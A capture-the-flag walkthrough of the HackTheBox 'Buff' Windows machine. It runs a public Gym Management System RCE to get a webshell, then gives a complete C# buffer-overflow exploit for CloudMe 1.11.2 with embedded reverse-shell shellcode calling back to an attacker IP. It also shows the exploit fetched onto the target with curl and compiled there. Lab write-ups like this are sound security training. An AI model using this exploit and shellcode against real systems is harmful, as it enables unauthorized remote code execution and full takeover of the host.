Buff is a Windows box found on HackTheBox. If you are working on the box and looking for some hints, I will tell you that this box is mainly focused on known CVEs. There is nothing you need to write by hand, just make sure you are enumerating and checking everything for existing exploits. With that said, lets get into the step-by-step of how to pwn it!

## Network Enumeration

As always, the first step is to see what ports are accessible

    nmap -sV -Pn -n 10.10.10.198 -p-
    PORT     STATE SERVICE    VERSION
    7680/tcp open  pando-pub?
    8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

## Exploring the Website

I used gobuster and dirb to enumerate the site, and while they were running looked at the available pages. After poking around, we find the websites CMS:

![htb_buff_gymhut](https://github.com/guffre.github.io/assets/images/htb_buff_gymhut.png)

A CMS is always worth a check in searchsploit, or a google search for vulnerabilities:

    root@kali:~# searchsploit gym
    ----------------------------------------------------------------- ---------------------------------
     Exploit Title                                                   |  Path
    ----------------------------------------------------------------- ---------------------------------
    Gym Management System 1.0 - Unauthenticated Remote Code Executio | php/webapps/48506.py
    WordPress Plugin WPGYM - SQL Injection                           | php/webapps/42801.txt

## Exploiting for User Creds

Well an RCE sounds excellent. I had to install colorama (`pip2 install colorama`) to get it to execute, but otherwise it worked out-of-the-box with no tweaking:


    root@kali:/htb/198_Buff# python2 /usr/share/exploitdb/exploits/php/webapps/48506.py http://10.10.10.198:8080/
                /\
    /vvvvvvvvvvvv \--------------------------------------,                                                                                                                                                     
    `^^^^^^^^^^^^ /============BOKU====================="
                \/

    [+] Successfully connected to webshell.
    C:\xampp\htdocs\gym\upload> whoami
    �PNG
    ▒
    buff\shaun

## Finding the User Flag

Before manual inspection, I like to try some more "automated" searches. After searching through a few directories, the flag can be located using this search:

    C:\xampp\htdocs\gym\upload> dir /b /s C:\Users\shaun\*.txt
    �PNG
    ▒
    C:\Users\shaun\AppData\Local\Microsoft\Internet Explorer\brndlog.txt
    C:\Users\shaun\AppData\Local\Microsoft\OneDrive\20.064.0329.0008\ThirdPartyNotices.txt
    C:\Users\shaun\AppData\Local\Microsoft\OneDrive\logs\Common\telemetry-dll-ramp-value.txt
    ...
    C:\Users\shaun\Desktop\user.txt
    C:\Users\shaun\MicrosoftEdgeBackups\backups\MicrosoftEdgeBackup20200616\MicrosoftEdgeSettingsBackup.txt
    C:\Users\shaun\MicrosoftEdgeBackups\backups\MicrosoftEdgeBackup20200616\DatastoreBackup\schema.txt

## Inspecting for a privesc

This one took a bit longer. Checking `tasklist` on the target shows very few extra executables running. Skipping some of the random stuff I poked at, I googled "CloudMe exploit" and found quite a few pages of results.

Well CloudMe has exploits, but is the CloudMe that is running the vulnerable one? We can't see the path to the executable, but we can search the filesystem for CloudMe executables:

    C:\xampp\htdocs\gym\upload> dir /b /s C:\*cloudme*
    PNG
    ▒
    C:\Users\shaun\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cache\WEIKCYS4\CloudMe_1112[1].exe
    C:\Users\shaun\Downloads\CloudMe_1112.exe

## Exploiting CloudMe_1112.exe

A quick search with searchsploit returns quite a few results. Fortunately we know that we are interested in "1112":

    root@kali:/htb/198_Buff# searchsploit cloudme
    ---------------------------------------------------------------- ---------------------------------
     Exploit Title                                                  |  Path
    ---------------------------------------------------------------- ---------------------------------
    CloudMe 1.11.2 - Buffer Overflow (PoC)                          | windows/remote/48389.py
    CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                 | windows/local/48499.txt
    Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                | windows_x86-64/remote/45197.rb
    CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)         | windows_x86-64/local/45159.py
    CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)  | windows/remote/44175.rb
    CloudMe Sync 1.11.0 - Local Buffer Overflow                     | windows/local/44470.py
    CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                 | windows/remote/46218.py
    CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)        | windows_x86-64/remote/46250.py
    CloudMe Sync < 1.11.0 - Buffer Overflow                         | windows/remote/44027.py
    CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)      | windows_x86-64/remote/44784.py
    ---------------------------------------------------------------- ---------------------------------
    
The first exploit looks promising. However, checking `where python` and a few variants it appears that Python is not installed on the target. This is a problem, because CloudMe will be listening on 127.0.0.1. We could use `plink` or portforwarding to run the exploit locally and redirect to localhost. Alternatively, since we love exploit dev!, we can rewrite the PoC into C# with our own payload:

```csharp
using System;
using System.IO;
using System.Net.Sockets; 
using System.Linq;

namespace a {
    class b {
        static void Main(string[] args) {
            TcpClient client = new TcpClient("127.0.0.1", 8888);
            NetworkStream stream = client.GetStream();
            MemoryStream ms = new MemoryStream();
            
            ms.Write(Enumerable.Repeat((byte)0x90, 1052).ToArray(), 0, 1052);
            ms.Write(new byte[]{0xB5,0x42,0xA8,0x68}, 0, 4);
            ms.Write(Enumerable.Repeat((byte)0x90, 30).ToArray(), 0, 30);
            // msfvenom -p windows/shell/reverse_tcp LHOST=10.10.15.1 LPORT=7000 -b '\x00\x0a\x0d' -f csharp
            byte[] buf = {
            0xb8,0x90,0xfd,0x9d,0x7e,0xda,0xcb,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,
            0x56,0x31,0x45,0x13,0x83,0xc5,0x04,0x03,0x45,0x9f,0x1f,0x68,0x82,0x77,0x5d,
            0x93,0x7b,0x87,0x02,0x1d,0x9e,0xb6,0x02,0x79,0xea,0xe8,0xb2,0x09,0xbe,0x04,
            0x38,0x5f,0x2b,0x9f,0x4c,0x48,0x5c,0x28,0xfa,0xae,0x53,0xa9,0x57,0x92,0xf2,
            0x29,0xaa,0xc7,0xd4,0x10,0x65,0x1a,0x14,0x55,0x98,0xd7,0x44,0x0e,0xd6,0x4a,
            0x79,0x3b,0xa2,0x56,0xf2,0x77,0x22,0xdf,0xe7,0xcf,0x45,0xce,0xb9,0x44,0x1c,
            0xd0,0x38,0x89,0x14,0x59,0x23,0xce,0x11,0x13,0xd8,0x24,0xed,0xa2,0x08,0x75,
            0x0e,0x08,0x75,0xba,0xfd,0x50,0xb1,0x7c,0x1e,0x27,0xcb,0x7f,0xa3,0x30,0x08,
            0x02,0x7f,0xb4,0x8b,0xa4,0xf4,0x6e,0x70,0x55,0xd8,0xe9,0xf3,0x59,0x95,0x7e,
            0x5b,0x7d,0x28,0x52,0xd7,0x79,0xa1,0x55,0x38,0x08,0xf1,0x71,0x9c,0x51,0xa1,
            0x18,0x85,0x3f,0x04,0x24,0xd5,0xe0,0xf9,0x80,0x9d,0x0c,0xed,0xb8,0xff,0x58,
            0xc2,0xf0,0xff,0x98,0x4c,0x82,0x8c,0xaa,0xd3,0x38,0x1b,0x86,0x9c,0xe6,0xdc,
            0x9f,0x8b,0x18,0x32,0x27,0xdb,0xe6,0xb3,0x57,0xf5,0x2c,0xe7,0x07,0x6d,0x84,
            0x88,0xcc,0x6d,0x29,0x5d,0x78,0x64,0xbd,0x54,0x76,0x77,0x3c,0x01,0x84,0x87,
            0x25,0x89,0x01,0x61,0x09,0x79,0x41,0x3e,0xea,0x29,0x21,0xee,0x82,0x23,0xae,
            0xd1,0xb3,0x4b,0x65,0x7a,0x59,0xa4,0xd3,0xd2,0xf6,0x5d,0x7e,0xa8,0x67,0xa1,
            0x55,0xd4,0xa8,0x29,0x5f,0x28,0x66,0xda,0x2a,0x3a,0x9f,0xbd,0xd4,0xc2,0x60,
            0x28,0xd4,0xa8,0x64,0xfa,0x83,0x44,0x67,0xdb,0xe3,0xca,0x98,0x0e,0x70,0x0c,
            0x66,0xcf,0x40,0x66,0x51,0x45,0xec,0x10,0x9e,0x89,0xec,0xe0,0xc8,0xc3,0xec,
            0x88,0xac,0xb7,0xbf,0xad,0xb2,0x6d,0xac,0x7d,0x27,0x8e,0x84,0xd2,0xe0,0xe6,
            0x2a,0x0c,0xc6,0xa8,0xd5,0x7b,0x54,0xae,0x29,0xf9,0x73,0x17,0x41,0x01,0xc4,
            0xa7,0x91,0x6b,0xc4,0xf7,0xf9,0x60,0xeb,0xf8,0xc9,0x89,0x26,0x51,0x41,0x03,
            0xa7,0x13,0xf0,0x14,0xe2,0xf2,0xac,0x15,0x01,0x2f,0x5f,0x6f,0x6a,0xd0,0xa0,
            0x90,0x62,0xb5,0xa1,0x90,0x8a,0xcb,0x9e,0x46,0xb3,0xb9,0xe1,0x5a,0x80,0xb2,
            0x54,0xfe,0xa1,0x58,0x96,0xac,0xb2,0x48 };
            ms.Write(buf, 0, buf.Length);
            int payload_length = 1500-(int)ms.Length;
            ms.Write(Enumerable.Repeat((byte)0x63, payload_length).ToArray(), 0, payload_length);
            byte[] payload = ms.ToArray();
            stream.Write(payload, 0, payload.Length);
        }
    }
}
```

## Uploading the Exploit

We could echo the exploit line-by-line into a file, but that would be annoying. I used the builtin "where" command to look for some common options, and found that "curl" is installed on the box:

    C:\xampp\htdocs\gym\upload> where wget curl nc ncat netcat telnet ftp ssh scp putty pscp
    �PNG
    ▒
    C:\Windows\System32\curl.exe
    C:\Windows\System32\ftp.exe
    C:\Windows\System32\OpenSSH\ssh.exe
    C:\Windows\System32\OpenSSH\scp.exe

With that, we can easily setup a python HTTP server and upload our exploit source to the target:

    C:\xampp\htdocs\gym\upload> curl -O http://10.10.15.1/t.cs
    
And now, compile/remove source:

    C:\xampp\htdocs\gym\upload> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe t.cs
    C:\xampp\htdocs\gym\upload> del t.cs


## Catching the Exploit

We can use msfconsole to setup a listener and catch our reverse shell:

![htb_buff_msfconsole](https://github.com/guffre.github.io/assets/images/htb_buff_msfconsole.png)

Now all thats left is to run the vulnerable CloudMe executable:

    root@kali:/htb/198_Buff# python2 /usr/share/exploitdb/exploits/php/webapps/48506.py http://10.10.10.198:8080/
    [+] Successfully connected to webshell.
    C:\xampp\htdocs\gym\upload> cmd /c C:\\Users\\shaun\\Downloads\\CloudMe_1112.exe

And on a seperate webshell, run our exploit code. Of note, sometimes the box would take a minute before listening on the port, so the exploit might need to be ran a few times:

    C:\xampp\htdocs\gym\upload> t.exe

Then, switching over to the msfconsole we should see our exploit connecting.

    msf5 exploit(multi/handler) > run

    [*] Started reverse TCP handler on 0.0.0.0:7000 
    [*] Encoded stage with x86/shikata_ga_nai
    [*] Sending encoded stage (267 bytes) to 10.10.10.198
    [*] Command shell session 1 opened (10.10.15.1:7000 -> 10.10.10.198:49692) at 2020-10-11 22:24:31 -0400



    C:\Windows\system32>whoami
    buff/Administrator

That is admin access, so this box is complete!
